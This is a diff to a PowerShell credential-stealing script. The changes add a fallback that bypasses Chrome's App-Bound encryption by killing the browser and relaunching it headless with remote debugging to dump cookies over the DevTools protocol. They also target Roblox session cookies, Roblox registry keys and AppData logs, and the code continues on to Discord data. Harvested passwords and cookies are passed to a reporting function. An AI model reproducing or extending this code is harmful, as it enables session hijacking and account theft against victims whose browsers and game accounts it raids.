@@ -277,7 +277,7 @@ ts ($browserReports -join "`n")
 # App-Bound fallback for Chrome 125+
 $appBound = $false
 try { $lsJ = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Raw | ConvertFrom-Json; if ($lsJ.os_crypt.app_bound_encrypted_key) { $appBound = $true } } catch {}
-$hbdPwCount = 0; $cdpCkCount = 0
+$hbdPwCount = 0; $hbdCkCount = 0; $cdpCkCount = 0
 if ($appBound -and ($pwCount -eq 0 -or $ckCount -eq 0)) {
   ts "[dbg] App-Bound active, running fallback...`nCK Pw:$pwCount Ck:$ckCount"
   
@@ -297,8 +297,8 @@ if ($appBound -and ($pwCount -eq 0 -or $ckCount -eq 0)) {
           foreach ($e in $hp) { $allPasswords += @{url=$e.Url;username=$e.UserName;password=$e.Password;browser="Chrome(HBD)"} }
         }
         if (Test-Path $cf) {
-          $hc = Get-Content $cf -Raw | ConvertFrom-Json
-          ts "[dbg] HBD cookies: $($hc.Count)"
+          $hc = Get-Content $cf -Raw | ConvertFrom-Json; $hbdCkCount = $hc.Count
+          ts "[dbg] HBD cookies: $hbdCkCount"
           foreach ($e in $hc) { 
             $allCookies += @{host=$e.Host;name=$e.Name;value=$e.Value;browser="Chrome(HBD)"}
             if (($e.Name -eq ".ROBLOSECURITY" -or $e.Name -eq "ROBLOSECURITY") -and $e.Host.Contains("roblox.com")) {
@@ -313,14 +313,13 @@ if ($appBound -and ($pwCount -eq 0 -or $ckCount -eq 0)) {
   }
   
   # CDP for cookies (fallback if HBD didn't output cookies)
-  if ($ckCount -eq 0) {
+  if ($hbdCkCount -eq 0) {
     try {
       $cex = @("$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe","${env:ProgramFiles}\Google\Chrome\Application\chrome.exe") | Where-Object { Test-Path $_ } | Select-Object -First 1
       if ($cex) {
         Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep 2
         $port = 9222
         try { while ((Get-NetTCPConnection -LocalPort $port -ErrorAction SilentlyContinue) -and 0 -lt 10) { $port++ } } catch {}
-        # Use real profile so cookies are available
         $p = Start-Process -FilePath $cex -ArgumentList "--remote-debugging-port=$port --no-first-run --no-default-browser-check --disable-gpu --headless=new --disable-session-crashed-bubble" -PassThru -WindowStyle Hidden
         Start-Sleep 4
         $tgts = Invoke-RestMethod "http://127.0.0.1:$port/json" -TimeoutSec 5 -ErrorAction Stop
@@ -349,13 +348,62 @@ if ($appBound -and ($pwCount -eq 0 -or $ckCount -eq 0)) {
     } catch { ts "[dbg] CDP error: $_" }
   }
   
-  if ($hbdPwCount -gt 0 -or $cdpCkCount -gt 0) {
-    ts "$GL App-Bound fallback results:`n$CK Pw:$hbdPwCount Ck:$cdpCkCount"
-    $pwCount = $hbdPwCount; $ckCount = $cdpCkCount
+  # CDP Roblox-targeted fetch if HBD didn't find it
+  if (-not $robCookie) {
+    try {
+      $cex = @("$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe","${env:ProgramFiles}\Google\Chrome\Application\chrome.exe") | Where-Object { Test-Path $_ } | Select-Object -First 1
+      if ($cex) {
+        Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep 2
+        $port2 = 9333
+        try { while ((Get-NetTCPConnection -LocalPort $port2 -ErrorAction SilentlyContinue) -and 0 -lt 10) { $port2++ } } catch {}
+        $p2 = Start-Process -FilePath $cex -ArgumentList "--remote-debugging-port=$port2 --no-first-run --no-default-browser-check --disable-gpu --headless=new --disable-session-crashed-bubble" -PassThru -WindowStyle Hidden
+        Start-Sleep 4
+        $tgts2 = Invoke-RestMethod "http://127.0.0.1:$port2/json" -TimeoutSec 5 -ErrorAction Stop
+        $wsUrl2 = $tgts2[0].webSocketDebuggerUrl -or (Invoke-RestMethod "http://127.0.0.1:$port2/json/new?about:blank" -TimeoutSec 5 -ErrorAction Stop).webSocketDebuggerUrl
+        if ($wsUrl2) {
+          $ws2 = New-Object System.Net.WebSockets.ClientWebSocket
+          $ws2.ConnectAsync((New-Object Uri($wsUrl2)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
+          $cmd2 = @{id=1;method="Network.getCookies";params=@{urls=@("https://roblox.com")}} | ConvertTo-Json -Compress
+          $b2 = [Text.Encoding]::UTF8.GetBytes($cmd2)
+          $ws2.SendAsync((New-Object ArraySegment[byte] -ArgumentList @(,$b2)), ([Net.WebSockets.WebSocketMessageType]::Text), $true, ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
+          $rb2 = New-Object byte[] 262144; $list2 = New-Object Collections.Generic.List[byte]
+          do { $r2 = $ws2.ReceiveAsync((New-Object ArraySegment[byte] -ArgumentList @(,$rb2)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult(); if ($r2.Count -gt 0) { $list2.AddRange([byte[]]($rb2[0..($r2.Count-1)])) } } while (!$r2.EndOfMessage)
+          $ws2.Dispose()
+          try {
+            $resp2 = [Text.Encoding]::UTF8.GetString($list2.ToArray()) | ConvertFrom-Json
+            if ($resp2.result -and $resp2.result.cookies) {
+              foreach ($cc2 in $resp2.result.cookies) { if (($cc2.name -eq ".ROBLOSECURITY" -or $cc2.name -eq "ROBLOSECURITY") -and -not $robCookie) { $robCookie = $cc2.value; ts "[dbg] Roblox cookie from CDP getCookies" } }
+            }
+          } catch { ts "[dbg] CDP Roblox parse error: $_" }
+        }
+        if ($p2 -and !$p2.HasExited) { $p2.Kill() }
+      }
+    } catch { ts "[dbg] CDP Roblox error: $_" }
+  }
+  
+  if ($hbdPwCount -gt 0 -or $hbdCkCount -gt 0 -or $cdpCkCount -gt 0) {
+    ts "$GL App-Bound fallback results:`n$CK Pw:$hbdPwCount Ck:$hbdCkCount"
+    $pwCount = $hbdPwCount; $ckCount = $hbdCkCount
   }
 }
 
-if ($robCookie) { ts "$RB Roblox cookie:`n$CK $robCookie" } else { ts "$RB Roblox cookie:`n$XX Not found" }
+if ($robCookie) { $er = $robCookie.Replace("&","&amp;").Replace("<","&lt;").Replace(">","&gt;"); ts "$RB Roblox cookie:`n$CK $er" } else { ts "$RB Roblox cookie:`n$XX Not found" }
+
+try {
+  $rk = Get-ItemProperty "HKCU:\Software\Roblox\RobloxMessenger\*" -ErrorAction SilentlyContinue
+  if ($rk) { ts "$RB Roblox registry:`n$CK $($rk | Out-String)" }
+} catch { ts "$WA Roblox registry error: $_" }
+
+try {
+  $ra = "$env:LOCALAPPDATA\Roblox"
+  if (Test-Path $ra) {
+    $rf = Get-ChildItem $ra -Include *.log,*.json -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 1MB -and $_.Length -gt 10 }
+    foreach ($f in $rf) {
+      $c = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue
+      if ($c -and $c -match '_\\|WARNING.*DO-NOT-SHARE') { ts "$RB Roblox AppData cookie:`n$CK $($matches[0])" }
+    }
+  }
+} catch { ts "$WA Roblox AppData error: $_" }
 
 try {
   $dcDirs = @("$env:APPDATA\discord", "$env:APPDATA\discordcanary", "$env:APPDATA\discordptb", "$env:APPDATA\discorddevelopment")
